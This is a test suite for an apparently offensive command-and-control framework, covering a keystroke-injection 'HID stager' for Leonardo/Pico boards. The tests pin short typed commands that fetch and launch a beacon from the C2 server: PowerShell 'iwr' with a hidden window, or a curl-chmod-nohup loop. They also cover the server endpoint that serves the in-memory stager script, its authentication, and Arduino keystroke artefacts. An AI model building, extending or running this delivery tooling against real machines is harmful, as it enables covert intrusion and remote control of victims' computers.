"""`--stager-mode download|inline` — the HID stager that fits on screen.

An operator measured the problem on a Leonardo: `--stager` typed the FULL
resilient stager, 11 498 characters, i.e. minutes of on-screen typing with the
Run dialog's own length limit in the way and a wide window in which anything
can steal focus. HID is the one channel where the LENGTH is the cost, because
the board types every character; the paste-a-command channels type nothing and
keep their inline one-liner.

So `download` is the default HERE and nowhere else: the board types a
~300-char fetcher and the C2 serves the beacon. Four properties are pinned:

1. the typed command fits the HID budget (and is an order of magnitude shorter
   than inline);
2. a command over the budget is REFUSED, not written — an operator already
   holding a board needs the refusal, not a three-minute typing session;
3. the command PARSES as the shell it is aimed at: a wrapper that nests the
   same quote character inside itself looks right on screen and hands the
   target a truncated command;
4. the artefact fetched in download mode is byte-identical to the one the
   inline dropper carries, so switching modes does not change what lands.
"""
import asyncio
import base64
import os
import shlex
import types
from unittest import mock

import pytest

from phantom.utils import short_stager as ss
from phantom.utils.builder import generate_dropper, windows_stager_script

HOST = "10.0.0.5"
PORT = 8443
# a real-shaped payload token: 64 hex chars, which is what makes the length
# assertion meaningful instead of optimistic
TOKEN = "0123456789abcdef" * 4
LEGACY_LIMIT = 600            # the budget the task asked for
POSIX = ("linux", "macos")


def _run(arg, tmp_path, name="artefact"):
    """Run `payload hid <arg> --out <tmp>`, return (content-or-None, notifier)."""
    from phantom.modules.payload import PayloadModule
    out = os.path.join(str(tmp_path), name)
    with mock.patch("phantom.modules.payload.notifier") as note:
        PayloadModule().do_hid(f"{arg} --out {out}")
    content = None
    if os.path.isfile(out):
        with open(out, encoding="utf-8") as handle:
            content = handle.read()
    return content, note


def _messages(call):
    return " ".join(str(c) for c in call.call_args_list)


class _FakeRequest:
    """Just enough of an aiohttp request for the stager handler."""

    def __init__(self, path="/s/windows", scheme="https", remote="127.0.0.1"):
        self.path = path
        self.scheme = scheme
        self.remote = remote
        self.headers = {}
        self.query = {}
        self.url = types.SimpleNamespace(host="", port=None)


class TestTheTypedCommandIsShort:
    @pytest.mark.parametrize("platform", ["windows", "linux", "macos"])
    def test_it_is_under_the_hid_budget(self, platform):
        cmd = ss.hid_download_command(platform, HOST, PORT, token=TOKEN)
        assert len(cmd) < LEGACY_LIMIT
        assert len(cmd) <= ss.MAX_TYPED_CHARS

    def test_it_is_an_order_of_magnitude_shorter_than_inline(self):
        short = ss.hid_download_command("windows", HOST, PORT, token=TOKEN)
        inline = generate_dropper("windows", HOST, PORT, use_ssl=True,
                                  resilient=True)
        assert len(short) * 10 < len(inline)

    def test_windows_fetches_with_iwr_and_hides_its_console(self):
        cmd = ss.hid_download_command("windows", HOST, PORT, token=TOKEN)
        assert cmd.startswith("powershell ")
        assert "iwr" in cmd          # iwr, not a full Invoke-WebRequest
        assert "-w h" in cmd         # hidden: no console window on the target

    @pytest.mark.parametrize("platform", POSIX)
    def test_posix_fetches_with_curl_and_starts_it_detached(self, platform):
        cmd = ss.hid_download_command(platform, HOST, PORT, token=TOKEN)
        assert "curl" in cmd
        assert "chmod +x" in cmd
        assert "nohup" in cmd

    def test_an_over_budget_command_is_refused_not_returned(self):
        # a 700-char host is not a typo we can fix for the operator, so the
        # refusal names the budget AND the flag that avoids it
        with pytest.raises(ValueError) as excinfo:
            ss.hid_download_command("windows", "h" * 700, PORT, token=TOKEN)
        assert str(ss.MAX_TYPED_CHARS) in str(excinfo.value)
        assert "stager-mode inline" in str(excinfo.value)

    def test_an_unknown_platform_is_refused(self):
        with pytest.raises(ValueError):
            ss.hid_download_command("amiga", HOST, PORT, token=TOKEN)


class TestTheCommandIsWellQuoted:
    """A typed command that does not parse is worse than a long one."""

    @pytest.mark.parametrize("platform", POSIX)
    def test_the_sh_wrapper_hands_the_shell_one_intact_script(self, platform):
        cmd = ss.hid_download_command(platform, HOST, PORT, token=TOKEN)
        parts = shlex.split(cmd)
        # `sh -c <one script>`: if the URL's quotes end the wrapper early this
        # becomes a burst of stray arguments and the retry loop never runs
        assert len(parts) == 3, parts
        assert parts[0] == "sh" and parts[1] == "-c"
        assert ss.download_route(platform) in parts[2]
        assert parts[2].startswith("while ! curl")

    @pytest.mark.parametrize("platform", POSIX)
    def test_the_url_is_one_literal_word_inside_the_script(self, platform):
        # Adjacent quoted/unquoted parts CONCATENATE, so a URL that repeats the
        # wrapper's own quote character still reaches sh — but UNQUOTED, and
        # the `?` of `?auth=<token>` is then a glob character inside the
        # script. Distinct quoting is what keeps it one literal word.
        cmd = ss.hid_download_command(platform, HOST, PORT, token=TOKEN)
        url = ss.short_stager_url(platform, f"https://{HOST}:{PORT}", TOKEN)
        assert f'"{url}"' in shlex.split(cmd)[2]

    def test_a_url_that_would_break_the_wrapper_is_refused(self):
        for bad in ("'", '"', "$", "`"):
            with pytest.raises(ValueError):
                ss.build_short_stager("linux", f"https://h/a{bad}b")

    def test_the_url_is_the_route_the_c2_serves(self):
        assert ss.download_route("windows") == "/s/windows"
        assert ss.download_route("linux") == "/api/v1/payload_linux"
        assert ss.download_route("macos") == "/api/v1/payload_macos"
        assert ss.download_route("amiga") == ""
        assert ss.short_stager_url("windows", "https://h:1", TOKEN) == \
            f"https://h:1/s/windows?auth={TOKEN}"
        assert ss.short_stager_url("linux", "https://h:1/") == \
            "https://h:1/api/v1/payload_linux"
        with pytest.raises(ValueError):
            ss.short_stager_url("amiga", "https://h:1")


class TestTheFetchedArtefactIsTheInlineOne:
    def test_the_served_script_is_the_inline_script_bit_for_bit(self):
        # `windows_stager_script` decodes the body out of the SAME
        # generate_dropper call the inline path types, which is the only
        # reason the two deliveries can be claimed to be the same artefact
        inline = generate_dropper("windows", HOST, PORT, use_ssl=True,
                                  resilient=False)
        expected = base64.b64decode(
            inline.rsplit(" -Enc ", 1)[1].strip()).decode("utf-16-le")
        assert windows_stager_script(HOST, PORT, True) == expected

    def test_the_served_script_is_the_one_shot_body(self):
        # the typed command already retries in a client-side loop; serving the
        # resilient WRAPPER too would schedule a second, unrequested
        # persistence (a RunKey/scheduled task) on the target
        script = windows_stager_script(HOST, PORT, True)
        assert "schtasks" not in script
        assert "GetDelegateForFunctionPointer" in script

    def test_the_typed_command_points_at_the_route_that_serves_it(self):
        cmd = ss.hid_download_command("windows", HOST, PORT, token=TOKEN)
        assert f"{HOST}:{PORT}{ss.download_route('windows')}" in cmd

    def test_the_endpoint_returns_that_exact_body(self):
        from phantom.core import c2_server as c2
        with mock.patch.object(c2, "server_instance") as srv, \
                mock.patch.object(c2, "_payload_token_ok", return_value=True):
            srv.host, srv.port = HOST, PORT
            response = asyncio.run(c2.handle_short_stager(_FakeRequest()))
        assert response.status == 200
        assert response.text == windows_stager_script(HOST, PORT, True)

    def test_the_endpoint_refuses_an_unauthenticated_caller(self):
        from phantom.core import c2_server as c2
        with mock.patch.object(c2, "server_instance") as srv, \
                mock.patch.object(c2, "_payload_token_ok", return_value=False):
            srv.host, srv.port = HOST, PORT
            response = asyncio.run(c2.handle_short_stager(_FakeRequest()))
        assert response.status == 403


class TestTheHidCommandDefaultsToDownload:
    def test_download_is_the_default_mode(self, tmp_path):
        content, note = _run("pico --stager windows --type-into windows",
                             tmp_path)
        assert content is not None
        assert "iwr" in content
        assert "/s/windows" in content
        # and NOT the 11.4k inline launcher
        assert " -Enc " not in content
        assert "download stager" in _messages(note.info)

    def test_the_default_matches_asking_for_it_explicitly(self, tmp_path):
        implicit, _ = _run("pico --stager windows --type-into windows",
                           tmp_path, "a")
        explicit, _ = _run("pico --stager windows --type-into windows "
                           "--stager-mode download", tmp_path, "b")
        assert implicit is not None and explicit is not None
        assert implicit.split("\n") == explicit.split("\n")

    def test_inline_is_still_reachable_and_says_how_long_it_is(self, tmp_path):
        content, note = _run("pico --stager windows --type-into windows "
                             "--stager-mode inline", tmp_path)
        assert content is not None
        assert " -Enc " in content
        # the operator is TOLD the length, because on this channel the length
        # is the cost
        assert "chars will be typed" in _messages(note.info)

    def test_the_typed_command_inside_the_artefact_is_under_the_budget(
            self, tmp_path):
        content, _ = _run("arduino --stager linux --type-into linux", tmp_path)
        assert content is not None
        line = next(ln for ln in content.splitlines()
                    if "Keyboard.print(F(" in ln)
        body = line.split('Keyboard.print(F("', 1)[1]
        body = body[:body.rindex('"));')]
        typed = body.replace('\\"', '"').replace("\\\\", "\\")
        assert len(typed) < LEGACY_LIMIT
        assert typed.startswith("sh -c ")

    def test_an_unknown_mode_is_refused_before_writing(self, tmp_path):
        content, note = _run("pico --stager linux --type-into linux "
                             "--stager-mode bogus", tmp_path)
        assert content is None
        assert "unknown --stager-mode" in _messages(note.error)

    def test_a_mode_without_a_value_is_refused(self):
        # `--out` cannot be appended here: it would become the flag's VALUE
        from phantom.modules.payload import PayloadModule
        with mock.patch("phantom.modules.payload.notifier") as note:
            PayloadModule().do_hid("pico --stager linux --type-into linux "
                                   "--stager-mode")
        assert "--stager-mode wants" in _messages(note.error)

    def test_the_mode_flag_without_a_stager_is_refused(self, tmp_path):
        # the flag only decides how `--stager` is DELIVERED: silently ignoring
        # it would let an operator believe the mode was applied
        content, note = _run("pico whoami --stager-mode inline", tmp_path)
        assert content is None
        assert "--stager-mode decides" in _messages(note.error)

    def test_the_help_lists_the_flag(self):
        from phantom.modules.payload import PayloadModule
        commands = PayloadModule().build_commands()
        assert any("--stager-mode" in c for c in commands["DELIVERY"])


class TestNothingElseChanged:
    """The other channels PASTE a command; nothing is typed there, so an
    inline one-liner costs them nothing and must keep being the default."""

    def test_generate_dropper_still_returns_the_inline_one_liner(self):
        for platform in ("windows", "linux", "macos"):
            dropped = generate_dropper(platform, HOST, PORT, use_ssl=True,
                                       resilient=True)
            assert dropped
            assert len(dropped) > LEGACY_LIMIT

    def test_the_windows_inline_dropper_is_the_powershell_launcher(self):
        inline = generate_dropper("windows", HOST, PORT, use_ssl=True,
                                  resilient=True)
        assert inline.startswith("powershell ")
        assert " -Enc " in inline

    def test_from_payload_is_untouched_by_the_mode_flag(self, tmp_path,
                                                        monkeypatch):
        entry = {
            "id": "3f2a91c4-1111-2222-3333-444455556666",
            "platform": "windows",
            "command": "powershell -NoP -Enc AAAA",
            "description": "Custom C++ Beacon (x64)",
            "source": "c2_shell",
        }
        monkeypatch.setattr("phantom.utils.payload_manager.get_custom_beacons",
                            lambda: [entry])
        content, note = _run("arduino --from-payload 3f2a91c4 "
                             "--type-into windows", tmp_path)
        assert content is not None
        assert "powershell -NoP -Enc AAAA" in content
        assert "stager" not in _messages(note.error)
